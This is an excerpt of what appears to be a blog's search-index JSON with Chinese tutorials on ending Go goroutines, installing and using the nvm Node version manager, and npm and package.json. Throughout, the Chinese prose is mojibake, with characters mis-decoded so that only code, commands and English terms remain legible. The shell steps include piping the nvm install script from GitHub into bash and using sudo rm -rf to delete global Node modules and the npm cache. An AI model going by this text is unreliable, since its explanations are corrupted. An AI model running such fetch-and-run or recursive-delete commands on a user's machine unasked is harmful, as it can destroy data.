å¤–éƒ¨ï¼Œåªéœ€è¦ç­‰å¾…`WaitGroup`è¿”å›å³å¯ï¼š\n\n```\nclose(signal.done)\nsignal.wg.Wait()\n```\n\nåªè¦`Wait()`è¿”å›å°±èƒ½æ–­å®š`Goroutine`ç»“æŸäº†ã€‚\n\n\n\næ¨å¯¼ä¸€ä¸‹ï¼Œä¸éš¾å‘ç°ï¼Œå¯¹äºwriterä¹Ÿå¯ä»¥é‡‡ç”¨è¿™ç§æ–¹æ³•ã€‚äºæ˜¯ï¼Œæ€»ç»“ä¸€ä¸‹ï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªå«`routineSignal`çš„ç»“æ„ï¼Œç»“æ„é‡Œé¢åŒ…å«ä¸€ä¸ª`chan`ç”¨æ¥é€šçŸ¥`Goroutine`ç»“æŸï¼ŒåŒ…å«ä¸€ä¸ª`WaitGroup`ç”¨äº`Goroutine`é€šçŸ¥å¤–éƒ¨å®Œæˆå–„åã€‚è¿™æ ·ï¼Œé€šè¿‡è¿™ä¸ªç»“æ„çš„å®ä¾‹ä¼˜é›…çš„ç»ˆæ­¢`Goroutine`ï¼Œè€Œä¸”è¿˜å¯ä»¥ç¡®ä¿`Goroutine`ç»ˆæ­¢æˆåŠŸã€‚ ","tags":["golang"],"categories":["1_golangåŸºç¡€"]},{"title":"nodeç‰ˆæœ¬ç®¡ç†nvmçš„å®‰è£…å’Œä½¿ç”¨","url":"%2Fp%2Fdf22a20c.html","content":"\n\n\næˆ‘ä»¬å¯èƒ½åŒæ—¶åœ¨è¿›è¡Œ2ä¸ªé¡¹ç›®ï¼Œè€Œ2ä¸ªä¸åŒçš„é¡¹ç›®æ‰€ä½¿ç”¨çš„nodeç‰ˆæœ¬åˆæ˜¯ä¸ä¸€æ ·çš„ï¼Œæˆ–è€…æ˜¯è¦ç”¨æ›´æ–°çš„nodeç‰ˆæœ¬è¿›è¡Œè¯•éªŒå’Œå­¦ä¹ ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œå¯¹äºç»´æŠ¤å¤šä¸ªç‰ˆæœ¬çš„nodeå°†ä¼šæ˜¯ä¸€ä»¶éå¸¸éº»çƒ¦çš„äº‹æƒ…ï¼Œè€Œnvmå°±æ˜¯ä¸ºè§£å†³è¿™ä¸ªé—®é¢˜è€Œäº§ç”Ÿçš„ï¼Œä»–å¯ä»¥æ–¹ä¾¿çš„åœ¨åŒä¸€å°è®¾å¤‡ä¸Šè¿›è¡Œå¤šä¸ªnodeç‰ˆæœ¬ä¹‹é—´åˆ‡æ¢ï¼Œè€Œè¿™ä¸ªæ­£æ˜¯nvmçš„ä»·å€¼æ‰€åœ¨ã€‚\n\n\n\n### 1. nodejsï¼Œnpmï¼Œnvmä¹‹é—´çš„åŒºåˆ«\n\n+ nodejsï¼šåœ¨é¡¹ç›®å¼€å‘æ—¶çš„æ‰€éœ€è¦çš„ä»£ç åº“\n\n+ npmï¼šnodejs åŒ…ç®¡ç†å·¥å…·ã€‚åœ¨å®‰è£…çš„ nodejs çš„æ—¶å€™ï¼Œnpm ä¹Ÿä¼šè·Ÿç€ä¸€èµ·å®‰è£…ï¼Œå®ƒæ˜¯åŒ…ç®¡ç†å·¥å…·ã€‚npm ç®¡ç† nodejs ä¸­çš„ç¬¬ä¸‰æ–¹æ’ä»¶\n\n+ nvmï¼šnodejs ç‰ˆæœ¬ç®¡ç†å·¥å…·ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼šä¸€ä¸ª nvm å¯ä»¥ç®¡ç†å¾ˆå¤š node ç‰ˆæœ¬å’Œ npm ç‰ˆæœ¬ã€‚\n\n\n\n<!-- more -->\n\n### 2. nvmçš„å®‰è£…:\n\nå¦‚æœåœ¨å®‰è£…nvmä¹‹å‰å°±å®‰è£…äº†node, é‚£ä¹ˆæœ€å¥½åœ¨å®‰è£…ä¹‹å‰æ¸…ç†ä¸‹å…¨å±€çš„nodeç¯å¢ƒ.\n\n```shell\nnpm ls -g --depth=0 # æŸ¥çœ‹å·²ç»å®‰è£…åœ¨å…¨å±€çš„æ¨¡å—ï¼Œä»¥ä¾¿åˆ é™¤è¿™äº›å…¨å±€æ¨¡å—åå†æŒ‰ç…§ä¸åŒçš„ node ç‰ˆæœ¬é‡æ–°è¿›è¡Œå…¨å±€å®‰è£…\n\nsudo rm -rf /usr/local/lib/node_modules # åˆ é™¤å…¨å±€ node_modules ç›®å½•\n\nsudo rm -rf ~/.npm/ # åˆ é™¤æ¨¡å—ç¼“å­˜ç›®å½•\n\nsudo rm /usr/local/bin/node # åˆ é™¤ node\n\ncd  /usr/local/bin && ls -l | grep \"../lib/node_modules/\" | awk '{print $9}'| xargs rm # åˆ é™¤å…¨å±€ node æ¨¡å—æ³¨å†Œçš„è½¯é“¾\n```\n\n\n\nå®‰è£…: https://github.com/nvm-sh/nvm\n\n```shell\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.34.0/install.sh | bash\n```\n\né‡æ–°æ‰“å¼€ä¸€ä¸ªç»ˆç«¯è¾“å…¥ `nvm`å³å¯\n\n\n\n### 3. nvmå¸¸ç”¨æŒ‡ä»¤\n\n```shell\nnvm version #æŸ¥çœ‹å½“å‰çš„ç‰ˆæœ¬\n\nnvm ls-remote #åˆ—å‡ºæ‰€æœ‰å¯å®‰è£…çš„ç‰ˆæœ¬\n\nnvm install <version> #å®‰è£…æŒ‡å®šçš„ç‰ˆæœ¬ï¼Œå¦‚nvm install v8.14.0\n\nnvm uninstall <version> #å¸è½½æŒ‡å®šçš„ç‰ˆæœ¬\n\nnvm ls #åˆ—å‡ºæ‰€æœ‰å·²ç»å®‰è£…çš„ç‰ˆæœ¬\n\nnvm use <version> #åˆ‡æ¢ä½¿ç”¨æŒ‡å®šçš„ç‰ˆæœ¬\n\nnvm current #æ˜¾ç¤ºå½“å‰ä½¿ç”¨çš„ç‰ˆæœ¬\n\nnvm alias default <version> #è®¾ç½®é»˜è®¤nodeç‰ˆæœ¬\n\n```\n\n\n\n#### 3.1 å®‰è£…æœ€æ–°ç¨³å®šç‰ˆ node\n\n```shell\nnvm install stable  \n```\n\n\n\n#### 3.2 nodeè¢«å®‰è£…åœ¨å“ªé‡Œäº†å‘¢?\n\nåœ¨ç»ˆç«¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨which nodeæ¥æŸ¥çœ‹æˆ‘ä»¬çš„nodeè¢«å®‰è£…åˆ°äº†å“ªé‡Œï¼Œè¿™é‡Œç»ˆç«¯æ‰“å°å‡ºæ¥çš„åœ°å€å…¶å®æ˜¯ä½ å½“å‰ä½¿ç”¨çš„nodeç‰ˆæœ¬å¿«æ·æ–¹å¼çš„åœ°å€ã€‚\n\n```\n$ which node\n/Users/liuwei/.nvm/versions/node/v12.2.0/bin/node\n\n\n$ which npm\n/Users/liuwei/.nvm/versions/node/v12.2.0/bin/npm\n```\n\n\n\n### 4. nvm å’Œ n  çš„åŒºåˆ«\n\nåœ¨ node çš„ç‰ˆæœ¬ç®¡ç†å·¥å…·ä¸­ï¼Œnvm è‡ªç„¶å£°åè¿œæ‰¬ï¼Œç„¶è€Œæˆ‘ä»¬ä¹Ÿä¸èƒ½å¿˜äº†æ¥è‡ª TJ çš„ nã€‚è¿™ä¸¤ç§ï¼Œæ˜¯ç›®å‰æœ€ä¸»æµçš„æ–¹æ¡ˆã€‚\n\nå…³äºè¿™ä¸¤ä¸ªå·¥å…·å¦‚ä½•å®‰è£…å’Œä½¿ç”¨ï¼Œè¿™é‡Œä¸å†èµ˜è¨€ï¼Œè¯·è§å®ƒä»¬å„è‡ªçš„ä¸»é¡µï¼š\n\n- [creationix/nvm](https://github.com/creationix/nvm)\n- [tj/n](https://github.com/tj/n)\n\næ¥ä¸‹æ¥æˆ‘ä»¬ç€é‡å…³æ³¨ä¸€ä¸‹ nvm å’Œ n çš„è¿ä½œæœºåˆ¶å’Œç‰¹æ€§ã€‚\n\n#### 4.1 n\n\nn æ˜¯ä¸€ä¸ªéœ€è¦å…¨å±€å®‰è£…çš„ npm packageã€‚\n\n```shell\nnpm install -g n\n```\n\n\nè¿™æ„å‘³ç€ï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨ n ç®¡ç† node ç‰ˆæœ¬å‰ï¼Œé¦–å…ˆéœ€è¦ä¸€ä¸ª node ç¯å¢ƒã€‚æˆ‘ä»¬æˆ–è€…ç”¨ Homebrew æ¥å®‰è£…ä¸€ä¸ª nodeï¼Œæˆ–è€…ä»å®˜ç½‘ä¸‹è½½ pkg æ¥å®‰è£…ï¼Œæ€»ä¹‹æˆ‘ä»¬å¾—å…ˆè‡ªå·±è£…ä¸€ä¸ª node â€”â€” n æœ¬èº«æ˜¯æ²¡æ³•ç»™ä½ è£…çš„ã€‚\n\nç„¶åæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ n æ¥å®‰è£…ä¸åŒç‰ˆæœ¬çš„ nodeã€‚\n\nåœ¨å®‰è£…çš„æ—¶å€™ï¼Œn ä¼šå…ˆå°†æŒ‡å®šç‰ˆæœ¬çš„ node å­˜å‚¨ä¸‹æ¥ï¼Œç„¶åå°†å…¶å¤åˆ¶åˆ°æˆ‘ä»¬ç†ŸçŸ¥çš„è·¯å¾„/usr/local/binï¼Œéå¸¸ç®€å•æ˜äº†ã€‚å½“ç„¶ç”±äº n ä¼šæ“ä½œåˆ°éç”¨æˆ·ç›®å½•ï¼Œæ‰€ä»¥éœ€è¦åŠ  sudo æ¥æ‰§è¡Œå‘½ä»¤ã€‚\n\næ‰€ä»¥è¿™æ ·çœ‹æ¥ï¼Œn åœ¨å…¶å®ç°ä¸Šæ˜¯ä¸€ä¸ªéå¸¸æ˜“ç†è§£çš„æ–¹æ¡ˆã€‚\n\n\n\n#### 4.2 nvm\n\næˆ‘ä»¬å†æ¥çœ‹ nvmã€‚ä¸åŒäº nï¼Œnvm ä¸æ˜¯ä¸€ä¸ª npm packageï¼Œè€Œæ˜¯ä¸€ä¸ªç‹¬ç«‹è½¯ä»¶åŒ…ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬éœ€è¦å•ç‹¬ä½¿ç”¨å®ƒçš„å®‰è£…é€»è¾‘ï¼š\n\n```shell\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.34.0/install.sh | bash(zsh)# æ³¨æ„åé¢çš„bashç¯å¢ƒ\n```\n\n\n\nç„¶åæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ nvm æ¥å®‰è£…ä¸åŒç‰ˆæœ¬çš„ nodeã€‚\n\nåœ¨å®‰è£…çš„æ—¶å€™ï¼Œnvm å°†ä¸åŒçš„ node ç‰ˆæœ¬å­˜å‚¨åˆ° ~/.nvm/<version>/ ä¸‹ï¼Œç„¶åä¿®æ”¹$PATHï¼Œå°†æŒ‡å®šç‰ˆæœ¬çš„ node è·¯å¾„åŠ å…¥ï¼Œè¿™æ ·æˆ‘ä»¬è°ƒç”¨çš„ node å‘½ä»¤å³æ˜¯ä½¿ç”¨æŒ‡å®šç‰ˆæœ¬çš„ nodeã€‚\n\nnvm æ˜¾ç„¶æ¯” n è¦å¤æ‚ä¸€äº›ï¼Œä½†æ˜¯å¦ä¸€æ–¹é¢ï¼Œç”±äºå®ƒæ˜¯ä¸€ä¸ªç‹¬ç«‹è½¯ä»¶åŒ…ï¼Œå› æ­¤å®ƒå’Œ node ä¹‹é—´çš„å…³ç³»çœ‹ä¸Šå»æ›´åˆä¹é€»è¾‘ï¼šnvm ä¸ä¾èµ– node ç¯å¢ƒï¼Œæ˜¯ node ä¾èµ– nvmï¼›è€Œä¸åƒ n é‚£æ ·äº§ç”Ÿç±»ä¼¼å¾ªç¯ä¾èµ–çš„é—®é¢˜ã€‚\n\n","tags":["nodejs"],"categories":["nodejs"]},{"title":"nodejsçš„æ¨¡å—å®‰è£…å’Œpackage.json","url":"%2Fp%2Fd100a0c2.html","content":"\n\n\n### 1. npm ä»‹ç»\n\n[npm](https://www.npmjs.com/package/npm) æ˜¯ Node çš„æ¨¡å—ç®¡ç†å™¨ï¼ŒåŠŸèƒ½æå…¶å¼ºå¤§ã€‚å®ƒæ˜¯ Node è·å¾—æˆåŠŸçš„é‡è¦åŸå› ä¹‹ä¸€ã€‚\n\nnpmä¸éœ€è¦å•ç‹¬å®‰è£…ã€‚åœ¨å®‰è£…Nodeçš„æ—¶å€™ï¼Œä¼šè¿å¸¦ä¸€èµ·å®‰è£…npmã€‚ä½†æ˜¯ï¼ŒNodeé™„å¸¦çš„npmå¯èƒ½ä¸æ˜¯æœ€æ–°ç‰ˆæœ¬ï¼Œæœ€å¥½ç”¨ä¸‹é¢çš„å‘½ä»¤ï¼Œæ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ã€‚\n\n```shell\nnpm install npm@latest -g \n```\n\nä¸Šé¢çš„å‘½ä»¤ä¸­ï¼Œ@latestè¡¨ç¤ºæœ€æ–°ç‰ˆæœ¬ï¼Œ-gè¡¨ç¤ºå…¨å±€å®‰è£…ã€‚æ‰€ä»¥ï¼Œå‘½ä»¤çš„ä¸»å¹²æ˜¯npm install npmï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨npmå®‰è£…è‡ªå·±ã€‚ä¹‹æ‰€ä»¥å¯ä»¥è¿™æ ·ï¼Œæ˜¯å› ä¸ºnpmæœ¬èº«ä¸Nodeçš„å…¶ä»–æ¨¡å—æ²¡æœ‰åŒºåˆ«ã€‚\n\n<!-- more -->\n\n\n\n### 2. npm å®‰è£…\n\n#### 2.1 npm install \n\n[npm install](https://docs.npmjs.com/cli/install) å‘½ä»¤ç”¨æ¥å®‰è£…æ¨¡å—åˆ°node_modulesç›®å½•ã€‚\n\n```shell\n $ npm install <packageName> \n```\n\n\n\nå®‰è£…ä¹‹å‰ï¼Œnpm installä¼šå…ˆæ£€æŸ¥ï¼Œnode_modulesç›®å½•ä¹‹ä¸­æ˜¯å¦å·²ç»å­˜åœ¨æŒ‡å®šæ¨¡å—ã€‚å¦‚æœå­˜åœ¨ï¼Œå°±ä¸å†é‡æ–°å®‰è£…äº†ï¼Œå³ä½¿è¿œç¨‹ä»“åº“å·²ç»æœ‰äº†ä¸€ä¸ªæ–°ç‰ˆæœ¬ï¼Œä¹Ÿæ˜¯å¦‚æ­¤ã€‚\n\nå¦‚æœä½ å¸Œæœ›ï¼Œä¸€ä¸ªæ¨¡å—ä¸ç®¡æ˜¯å¦å®‰è£…è¿‡ï¼Œnpm éƒ½è¦å¼ºåˆ¶é‡æ–°å®‰è£…ï¼Œå¯ä»¥ä½¿ç”¨-fæˆ–--forceå‚æ•°ã€‚\n\n```shell\n $ npm install <packageName> --force\n```\n\n\n\n#### 2.2 npm update\n\nå¦‚æœæƒ³æ›´æ–°å·²å®‰è£…æ¨¡å—ï¼Œå°±è¦ç”¨åˆ°[npm update](https://docs.npmjs.com/cli/update)å‘½ä»¤ã€‚\n\n```shell\n $ npm update <packageName> \n```\n\nå®ƒä¼šå…ˆåˆ°è¿œç¨‹ä»“åº“æŸ¥è¯¢æœ€æ–°ç‰ˆæœ¬ï¼Œç„¶åæŸ¥è¯¢æœ¬åœ°ç‰ˆæœ¬ã€‚å¦‚æœæœ¬åœ°ç‰ˆæœ¬ä¸å­˜åœ¨ï¼Œæˆ–è€…è¿œç¨‹ç‰ˆæœ¬è¾ƒæ–°ï¼Œå°±ä¼šå®‰è£…ã€‚\n\n\n\n#### 2.3 registry\n\nnpm updateå‘½ä»¤æ€ä¹ˆçŸ¥é“æ¯ä¸ªæ¨¡å—çš„æœ€æ–°ç‰ˆæœ¬å‘¢ï¼Ÿ\n\nç­”æ¡ˆæ˜¯ npm æ¨¡å—ä»“åº“æä¾›äº†ä¸€ä¸ªæŸ¥è¯¢æœåŠ¡ï¼Œå«åš registry ã€‚ä»¥ npmjs.org ä¸ºä¾‹ï¼Œå®ƒçš„æŸ¥è¯¢æœåŠ¡ç½‘å€æ˜¯ https://registry.npmjs.org/ ã€‚\n\nè¿™ä¸ªç½‘å€åé¢è·Ÿä¸Šæ¨¡å—åï¼Œå°±ä¼šå¾—åˆ°ä¸€ä¸ª JSON å¯¹è±¡ï¼Œé‡Œé¢æ˜¯è¯¥æ¨¡å—æ‰€æœ‰ç‰ˆæœ¬çš„ä¿¡æ¯ã€‚æ¯”å¦‚ï¼Œè®¿é—® <https://registry.npmjs.org/react>ï¼Œå°±ä¼šçœ‹åˆ° react æ¨¡å—æ‰€æœ‰ç‰ˆæœ¬çš„ä¿¡æ¯ã€‚\n\nå®ƒè·Ÿä¸‹é¢å‘½ä»¤çš„æ•ˆæœæ˜¯ä¸€æ ·çš„ã€‚\n\n```shell\n $ npm view react  \n```\n\n\n\nregistry ç½‘å€çš„æ¨¡å—ååé¢ï¼Œè¿˜å¯ä»¥è·Ÿä¸Šç‰ˆæœ¬å·æˆ–è€…æ ‡ç­¾ï¼Œç”¨æ¥æŸ¥è¯¢æŸä¸ªå…·ä½“ç‰ˆæœ¬çš„ä¿¡æ¯ã€‚æ¯”å¦‚ï¼Œ è®¿é—® https://registry.npmjs.org/react/v0.14.6 ï¼Œå°±å¯ä»¥çœ‹åˆ° React çš„ 0.14.6 ç‰ˆã€‚\n\nè¿”å›çš„ JSON å¯¹è±¡é‡Œé¢ï¼Œæœ‰ä¸€ä¸ªdist.tarballå±æ€§ï¼Œæ˜¯è¯¥ç‰ˆæœ¬å‹ç¼©åŒ…çš„ç½‘å€ã€‚\n\n```json\ndist: {   \n\tshasum: '2a57c2cf8747b483759ad8de0fa47fb0c5cf5c6a',   \n\ttarball: 'http://registry.npmjs.org/react/-/react-0.14.6.tgz'  \n},\n```\n\n\n\nåˆ°è¿™ä¸ªç½‘å€ä¸‹è½½å‹ç¼©åŒ…ï¼Œåœ¨æœ¬åœ°è§£å‹ï¼Œå°±å¾—åˆ°äº†æ¨¡å—çš„æºç ã€‚`npm install`å’Œ`npm update`å‘½ä»¤ï¼Œéƒ½æ˜¯é€šè¿‡è¿™ç§æ–¹å¼å®‰è£…æ¨¡å—çš„ã€‚\n\n\n\n#### 2.4 ç¼“å­˜ç›®å½•\n\nnpm installæˆ–npm updateå‘½ä»¤ï¼Œä» registry ä¸‹è½½å‹ç¼©åŒ…ä¹‹åï¼Œéƒ½å­˜æ”¾åœ¨æœ¬åœ°çš„ç¼“å­˜ç›®å½•ã€‚\n\nè¿™ä¸ªç¼“å­˜ç›®å½•ï¼Œåœ¨ Linux æˆ– Mac é»˜è®¤æ˜¯ç”¨æˆ·ä¸»ç›®å½•ä¸‹çš„.npmç›®å½•ï¼Œåœ¨ Windows é»˜è®¤æ˜¯%AppData%/npm-cacheã€‚é€šè¿‡é…ç½®å‘½ä»¤ï¼Œå¯ä»¥æŸ¥çœ‹è¿™ä¸ªç›®å½•çš„å…·ä½“ä½ç½®ã€‚\n\n```shell\n $ npm config get cache \n /Users/liuwei/.npm\n```\n\n \n\n.npmç›®å½•ä¿å­˜ç€å¤§é‡æ–‡ä»¶ï¼Œæ¸…ç©ºå®ƒçš„å‘½ä»¤å¦‚ä¸‹ã€‚ \n\n```shell\n$ rm -rf ~/.npm/ \næˆ–\n$ npm cache clean \n```\n\n\n\n#### 2.5 æ¨¡å—çš„å®‰è£…è¿‡ç¨‹\n\næ€»ç»“ä¸€ä¸‹ï¼ŒNodeæ¨¡å—çš„å®‰è£…è¿‡ç¨‹æ˜¯è¿™æ ·çš„ã€‚\n\n1. å‘å‡ºnpm installå‘½ä»¤\n2. npm å‘ registry æŸ¥è¯¢æ¨¡å—å‹ç¼©åŒ…çš„ç½‘å€\n3. ä¸‹è½½å‹ç¼©åŒ…ï¼Œå­˜æ”¾åœ¨~/.npmç›®å½•\n4. è§£å‹å‹ç¼©åŒ…åˆ°å½“å‰é¡¹ç›®çš„node_modulesç›®å½•\n\n\n\næ³¨æ„ï¼Œä¸€ä¸ªæ¨¡å—å®‰è£…ä»¥åï¼Œæœ¬åœ°å…¶å®ä¿å­˜äº†ä¸¤ä»½ã€‚ä¸€ä»½æ˜¯~/.npmç›®å½•ä¸‹çš„å‹ç¼©åŒ…ï¼Œå¦ä¸€ä»½æ˜¯node_modulesç›®å½•ä¸‹è§£å‹åçš„ä»£ç ã€‚\n\nä½†æ˜¯ï¼Œè¿è¡Œnpm installçš„æ—¶å€™ï¼Œåªä¼šæ£€æŸ¥node_modulesç›®å½•ï¼Œè€Œä¸ä¼šæ£€æŸ¥~/.npmç›®å½•ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä¸€ä¸ªæ¨¡å—åœ¨ï½/.npmä¸‹æœ‰å‹ç¼©åŒ…ï¼Œä½†æ˜¯æ²¡æœ‰å®‰è£…åœ¨node_modulesç›®å½•ä¸­ï¼Œnpm ä¾ç„¶ä¼šä»è¿œç¨‹ä»“åº“ä¸‹è½½ä¸€æ¬¡æ–°çš„å‹ç¼©åŒ…ã€‚\n\n\n\n### 3. package.json\n\nç®¡ç†æœ¬åœ°å®‰è£… npm åŒ…çš„æœ€å¥½æ–¹å¼å°±æ˜¯åˆ›å»º package.json æ–‡ä»¶ã€‚ä¸€ä¸ª package.json æ–‡ä»¶å¯ä»¥æœ‰ä»¥ä¸‹å‡ ç‚¹ä½œç”¨ï¼š\n\n+ ä½œä¸ºä¸€ä¸ªæè¿°æ–‡ä»¶ï¼Œæè¿°äº†ä½ çš„é¡¹ç›®ä¾èµ–å“ªäº›åŒ…\n\n+ å…è®¸æˆ‘ä»¬ä½¿ç”¨ â€œè¯­ä¹‰åŒ–ç‰ˆæœ¬è§„åˆ™â€ï¼ˆåé¢ä»‹ç»ï¼‰æŒ‡æ˜ä½ é¡¹ç›®ä¾èµ–åŒ…çš„ç‰ˆæœ¬\n\n+ è®©ä½ çš„æ„å»ºæ›´å¥½åœ°ä¸å…¶ä»–å¼€å‘è€…åˆ†äº«ï¼Œä¾¿äºé‡å¤ä½¿ç”¨\n\n  \n\nä½¿ç”¨ `npm init` å³å¯åœ¨å½“å‰ç›®å½•åˆ›å»ºä¸€ä¸ª `package.json` æ–‡ä»¶ã€‚å¦‚æœå«Œå›ç­”è¿™ä¸€å¤§å †é—®é¢˜éº»çƒ¦ï¼Œå¯ä»¥ç›´æ¥è¾“å…¥` npm init -â€”yes` è·³è¿‡å›ç­”é—®é¢˜æ­¥éª¤ï¼Œç›´æ¥ç”Ÿæˆé»˜è®¤å€¼çš„ package.json æ–‡ä»¶ï¼š\n\n```json\n{\n  \"name\": \"package\",\n  \"version\": \"1.0.0\",\n  \"description\": \"\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\"\n  },\n  \"keywords\": [],\n  \"author\": \"\",\n  \"license\": \"ISC\"\n}\n```\n\n\n\n#### 3.1 package.json çš„å†…å®¹\n\n\n\n##### 3.1.1 `package.json` æ–‡ä»¶è‡³å°‘è¦æœ‰ä¸¤éƒ¨åˆ†å†…å®¹ï¼š\n\n1. â€œnameâ€\n   - å…¨éƒ¨å°å†™ï¼Œæ²¡æœ‰ç©ºæ ¼ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹åˆ’çº¿æˆ–è€…æ¨ªçº¿\n2. â€œversionâ€ \n   - x.x.x çš„æ ¼å¼\n   - ç¬¦åˆâ€œè¯­ä¹‰åŒ–ç‰ˆæœ¬è§„åˆ™â€\n\n\n\n##### 3.1.2 å…¶ä»–å†…å®¹ï¼š\n\n+ descriptionï¼šæè¿°ä¿¡æ¯ï¼Œæœ‰åŠ©äºæœç´¢\n+ main: `å…¥å£æ–‡ä»¶`ï¼Œä¸€èˆ¬éƒ½æ˜¯ index.js. å½“ä½¿ç”¨require()è¯­æ³•æ¥åŠ è½½ä¸€ä¸ªæ¨¡å—æ—¶ï¼Œå°±ä¼šçœ‹æ­¤å€¼\n+ scriptsï¼šæ”¯æŒçš„è„šæœ¬ï¼Œé»˜è®¤æ˜¯ä¸€ä¸ªç©ºçš„ test\n+ keywordsï¼šå…³é”®å­—ï¼Œæœ‰åŠ©äºåœ¨äººä»¬ä½¿ç”¨ npm search æœç´¢æ—¶å‘ç°ä½ çš„é¡¹ç›®\n+ authorï¼šä½œè€…ä¿¡æ¯\n+ licenseï¼šé»˜è®¤æ˜¯ MIT\n+ bugsï¼šå½“å‰é¡¹ç›®çš„ä¸€äº›é”™è¯¯ä¿¡æ¯ï¼Œå¦‚æœæœ‰çš„è¯\n\n\n\n##### 3.1.3 scriptså±æ€§\n\nå¯ä»¥æŒ‡å®šnpmå‘½ä»¤ç¼©å†™ã€‚\n\n```\n  \"scripts\": {\n    \"start\": \"node store.js\"\n  },\n```\n\n\n\næ‰§è¡Œnpm run startä»ç„¶å¯ä»¥è¿è¡ŒæˆåŠŸï¼Œé€šè¿‡scriptså±æ€§npm run startç­‰ä»·äºnode store.jsã€‚å…³äºscriptsçš„æ›´å…·ä½“çš„ä½¿ç”¨[è¯·çœ‹è¿™é‡Œ](http://www.ruanyifeng.com/blog/2016/10/npm_scripts.html)ã€‚\n\n\n\n#### 3.2 æŒ‡å®šä¾èµ–çš„åŒ…\n\næˆ‘ä»¬éœ€è¦åœ¨ `package.json` æ–‡ä»¶ä¸­æŒ‡å®šé¡¹ç›®ä¾èµ–çš„åŒ…ï¼Œè¿™æ ·åˆ«äººåœ¨æ‹¿åˆ°è¿™ä¸ªé¡¹ç›®æ—¶æ‰å¯ä»¥ä½¿ç”¨ `npm install` ä¸‹è½½ã€‚\n\nåŒ…æœ‰ä¸¤ç§ä¾èµ–æ–¹å¼ï¼š\n\n1. `dependencies`ï¼šåœ¨ç”Ÿäº§ç¯å¢ƒä¸­éœ€è¦ç”¨åˆ°çš„ä¾èµ–\n2. `devDependencies`ï¼šåœ¨å¼€å‘ã€æµ‹è¯•ç¯å¢ƒä¸­ç”¨åˆ°çš„ä¾èµ–\n\n\n\nä¸¾ä¸ªä¾‹å­ï¼š\n\n```\n{\n    \"name\": \"my-weex-demo\",\n    \"version\": \"1.0.0\",\n    \"description\": \"a weex project\",\n    \"main\": \"index.js\",\n    \"devDependencies\": {\n        \"babel-core\": \"^6.14.0\",\n        \"babel-loader\": \"^6.2.5\",\n        \"babel-preset-es2015\": \"^6.18.0\",\n        \"vue-loader\": \"^10.0.2\",\n        \"eslint\": \"^3.5.0\",\n        \"serve\": \"^1.4.0\",\n        \"webpack\": \"^1.13.2\",\n        \"weex-loader\": \"^0.3.3\",\n        \"weex-builder\": \"^0.2.6\"\n    },\n    \"dependencies\": {\n        \"weex-html5\": \"^0.3.2\",\n        \"weex-components\": \"*\"\n    }\n}\n```\n\n\n\n#### 3.3 semantic versioningï¼ˆè¯­ä¹‰åŒ–ç‰ˆæœ¬è§„åˆ™ï¼‰\n\n\n\ndependencies çš„å†…å®¹ï¼Œä»¥ \"weex-html5\": \"^0.3.2\" ä¸ºä¾‹ï¼Œæˆ‘ä»¬çŸ¥é“ key æ˜¯ä¾èµ–çš„åŒ…åç§°ï¼Œvalue æ˜¯è¿™ä¸ªåŒ…çš„ç‰ˆæœ¬ã€‚é‚£ç‰ˆæœ¬å‰é¢çš„ ^ æˆ–è€…ç‰ˆæœ¬ç›´æ¥æ˜¯ä¸€ä¸ª * æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿè¿™å°±æ˜¯ npm çš„ â€œSemantic versioningâ€ï¼Œç®€ç§°â€Semverâ€ï¼Œä¸­æ–‡å«ä¹‰å³â€œè¯­ä¹‰åŒ–ç‰ˆæœ¬è§„åˆ™â€ã€‚\n\nåœ¨å¼€å‘ä¸­æˆ‘ä»¬æœ‰è¿‡è¿™æ ·çš„ç»éªŒï¼šæœ‰æ—¶å€™ä¾èµ–çš„åŒ…å‡çº§åå¤§æ”¹ç‰ˆï¼Œä¹‹å‰æä¾›çš„æ¥å£ä¸è§äº†ï¼Œè¿™å¯¹ä½¿ç”¨è€…çš„é¡¹ç›®å¯èƒ½é€ æˆæå¤§çš„å½±å“ã€‚å› æ­¤æˆ‘ä»¬åœ¨å£°æ˜å¯¹æŸä¸ªåŒ…çš„ä¾èµ–æ—¶éœ€è¦æŒ‡æ˜æ˜¯å¦å…è®¸ update åˆ°æ–°ç‰ˆæœ¬ï¼Œä»€ä¹ˆæƒ…å†µä¸‹å…è®¸æ›´æ–°ã€‚è¿™å°±éœ€è¦å…ˆäº†è§£ npm åŒ…æä¾›è€…åº”è¯¥æ³¨æ„çš„ç‰ˆæœ¬å·è§„èŒƒã€‚\n\n\n\nå¦‚æœä¸€ä¸ªé¡¹ç›®æ‰“ç®—ä¸åˆ«äººåˆ†äº«ï¼Œåº”è¯¥ä» 1.0.0 ç‰ˆæœ¬å¼€å§‹ã€‚ä»¥åè¦å‡çº§ç‰ˆæœ¬åº”è¯¥éµå¾ªä»¥ä¸‹æ ‡å‡†ï¼š\n\n```\nè¡¥ä¸ç‰ˆæœ¬ï¼šè§£å†³äº† Bug æˆ–è€…ä¸€äº›è¾ƒå°çš„æ›´æ”¹ï¼Œå¢åŠ æœ€åä¸€ä½æ•°å­—ï¼Œæ¯”å¦‚ 1.0.1\nå°ç‰ˆæœ¬ï¼šå¢åŠ äº†æ–°ç‰¹æ€§ï¼ŒåŒæ—¶ä¸ä¼šå½±å“ä¹‹å‰çš„ç‰ˆæœ¬ï¼Œå¢åŠ ä¸­é—´ä¸€ä½æ•°å­—ï¼Œæ¯”å¦‚ 1.1.0\nå¤§ç‰ˆæœ¬ï¼šå¤§æ”¹ç‰ˆï¼Œæ— æ³•å…¼å®¹ä¹‹å‰çš„ï¼Œå¢åŠ ç¬¬ä¸€ä½æ•°å­—ï¼Œæ¯”å¦‚ 